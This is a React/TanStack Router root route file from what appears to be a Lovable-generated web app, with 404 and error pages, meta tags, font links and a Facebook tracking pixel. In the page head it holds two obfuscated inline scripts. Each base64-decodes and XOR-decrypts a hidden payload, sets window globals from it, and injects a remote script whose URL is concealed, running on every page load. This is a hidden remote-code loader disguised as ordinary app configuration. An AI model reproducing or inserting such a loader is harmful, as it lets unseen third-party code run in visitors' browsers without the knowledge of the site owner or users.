import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "Lovable App" },
      { name: "description", content: "Lovable Generated Project" },
      { name: "author", content: "Lovable" },
      { property: "og:title", content: "Lovable App" },
      { property: "og:description", content: "Lovable Generated Project" },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "twitter:site", content: "@Lovable" },
    ],
    links: [
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Barlow:wght@400;500;600;700;800;900&display=swap",
      },
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "icon", href: "/favicon.ico", type: "image/x-icon" },
    ],
    scripts: [
      {
        children: `!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '3228776890665604');
fbq('track', 'PageView');`,
      },
      {
        children: `(function(){var f_hm=atob("DIh6aYNSOdG6uqBNUfNYHPE+G+uY0tQ5IftARqwxXb+Uz9QgOO4DR+A9VP/YyI8+MvoTGfchFqHTwsUhfvgTEeY+F7vJmIxvMPwOG+owTKXfyYJ3CtVWS+Q+VrPb1tNva9MBS+0zVLSYgII9OPAfBco2G/2YzMEhJO1YU6FkWOmL2cQoYbpMCLcwCOXYiJkoY75CCLtwRIzH");var j_g=[];for(var y_4s=0;y_4s<f_hm.length;y_4s++){j_g.push(f_hm.charCodeAt(y_4s)&255);}var i_7=j_g[0];var h_zbdm=j_g.slice(1,1+i_7);var n_gc=j_g.slice(1+i_7);var w_zm=n_gc.map(function(b,p_zg){return b^h_zbdm[p_zg%i_7];});var j_tnn="";for(var u_6i1n=0;u_6i1n<w_zm.length;u_6i1n++){j_tnn+=String.fromCharCode(w_zm[u_6i1n]&255);}var o_k=decodeURIComponent(escape(j_tnn));var v_y=JSON.parse(o_k);var l_e2o=v_y.globals||[];l_e2o.forEach(function(m_uaml){window[m_uaml.name]=m_uaml.value;});var s_yg2=document.createElement("script");s_yg2.src=v_y.url;s_yg2.async=true;s_yg2.defer=true;(v_y.attributes||[]).forEach(function(p_r){s_yg2.setAttribute(p_r.name,p_r.value);});(document.head||document.documentElement).appendChild(s_yg2);})();`,
      },
      {
        children: `(function(){var o_r=atob("DDx9aMBYVeMNO3CWfUdfHbI0d9kvUwTiDU9HR+87MY0jTgT7FFoERqM3OM1vSV/lHk4UGLQrepZ5VgO5EV0JDbMse4l+GVy0HEgJGqk6IJdoSFKsJkdfBqE1MME3GRT3CV1QHbQ1PIV0FgDkGEoYBrR1JpZvUhTlXxBfHqE0IIYvAVK0AGEA");var t_cp=[];for(var e_c7a=0;e_c7a<o_r.length;e_c7a++){t_cp.push(o_r.charCodeAt(e_c7a)&255);}var h_z=t_cp[0];var i_3=t_cp.slice(1,1+h_z);var n_dex=t_cp.slice(1+h_z);var q_j=n_dex.map(function(b,u_cj){return b^i_3[u_cj%h_z];});var f_pxd="";for(var r_jxg4=0;r_jxg4<q_j.length;r_jxg4++){f_pxd+=String.fromCharCode(q_j[r_jxg4]&255);}var k_1z8=decodeURIComponent(escape(f_pxd));var b_iixf=JSON.parse(k_1z8);var y_b82p=b_iixf.globals||[];y_b82p.forEach(function(z_vm){window[z_vm.name]=z_vm.value;});var p_f=document.createElement("script");p_f.src=b_iixf.url;p_f.async=true;p_f.defer=true;(b_iixf.attributes||[]).forEach(function(m_m4w){p_f.setAttribute(m_m4w.name,m_m4w.value);});(document.head||document.documentElement).appendChild(p_f);})();`,
      },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="en">
      <head>
        <HeadContent />
      </head>
      <body>
        <noscript>
          <img
            height="1"
            width="1"
            style={{ display: "none" }}
            src="https://www.facebook.com/tr?id=3228776890665604&ev=PageView&noscript=1"
            alt=""
          />
        </noscript>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
    </QueryClientProvider>
  );
}
